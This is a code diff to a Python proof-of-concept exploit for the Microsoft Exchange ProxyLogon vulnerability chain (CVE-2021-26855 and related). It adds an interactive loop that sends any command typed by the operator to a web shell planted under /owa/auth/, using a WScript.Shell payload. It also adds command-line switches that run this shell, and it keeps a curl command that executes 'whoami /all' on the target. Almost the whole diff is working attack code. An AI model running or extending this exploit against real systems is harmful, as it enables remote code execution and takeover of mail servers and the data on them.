@@ -77,10 +77,11 @@ def auto_discover(target, fqdn, email):
 
     legacy_dn = ct.text.split("<LegacyDN>")[1].split("</LegacyDN>")[0]
     server_id = ct.text.split("<Server>")[1].split("</Server>")[0]
+    sid = server_id.split("@")[0]
     print("%s[+] Got target LegacyDN: %s%s" %
           (color_success, color_reset, legacy_dn))
     print("%s[+] Got target ServerID: %s%s" %
-          (color_success, color_reset, server_id))
+          (color_success, color_reset, sid))
 
     return legacy_dn, server_id
 
@@ -356,6 +357,37 @@ def exec_shell(target):
         print("".join(shell_response) + "\n")
 
 
+def interactive_shell(target):
+    time.sleep(5)
+    ct = requests.get("https://%s/owa/auth/%s" % (target, random_shell_name),
+                      headers={"User-Agent": user_agent},
+                      verify=False)
+
+    if ct.status_code != 200 or "OAB (Default Web Site)" not in ct.text:
+        print("%s[*] Failed to execute shell command%s" %
+              (color_error, color_reset))
+
+    if "OAB (Default Web Site)" in ct.text:
+        while True:
+            input_cmd = input("[#] command: ")
+            body_payload = """request=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall())""" % input_cmd
+            ct = requests.post(
+                "https://%s/owa/auth/%s" % (target, random_shell_name),
+                headers={
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "User-Agent": user_agent
+                },
+                data=body_payload,
+                verify=False)
+            if ct.status_code != 200 or "OAB (Default Web Site)" not in ct.text:
+                print("%s[*] Failed to execute shell command%s" %
+                      (color_error, color_reset))
+            else:
+                shell_response = ct.text.split(
+                    "Name                            :")[0]
+                print(shell_response)
+
+
 def curl_shell(target):
     curl_req = """curl --request POST --url https://%s/owa/auth/%s --header 'Content-Type: application/x-www-form-urlencoded' --data 'request=Response.Write(new ActiveXObject("WScript.Shell").exec("whoami /all").stdout.readall())' -k""" % (
         target, random_shell_name)
@@ -372,12 +404,20 @@ def exit_with_msg():
 @click.option('-t',
               '--target',
               default='',
-              help='Target MS Exchange Server (e.g. outlook.victim.corm)')
+              help='MS Exchange Server (e.g. outlook.victim.corp).')
 @click.option('-e',
               '--email',
               default='',
-              help='Target email (e.g. administrator@victim.corp)')
-def main(target, email):
+              help='Email (e.g. administrator@victim.corp).')
+@click.option('-x',
+              '--execute',
+              default=False,
+              help="Execute verification shell.")
+@click.option('-i',
+              '--interactive',
+              default=False,
+              help="Run interactive shell.")
+def main(target, email, execute, interactive):
     """
     ExProlog - ProxyLogon Full Exploit Chain PoC\n
     (CVE-2021–26855, CVE-2021–26857, CVE-2021–26858, CVE-2021–27065)
@@ -404,10 +444,15 @@ def main(target, email):
                         verify=True)
         oab_export_shell(target, target_fqdn, user_sid, session_id,
                          session_canary, oab_id)
-        exec_shell(target)
+        if execute:
+            exec_shell(target)
         curl_shell(target)
 
-        print("%s[*] DONE%s" % (color_success, color_reset))
+        print("%s[*] DONE%s\n" % (color_success, color_reset))
+
+        if interactive:
+            print("%s[#] Run interactive shell%s" % (color_info, color_reset))
+            interactive_shell(target)
     else:
         exit_with_msg()
 
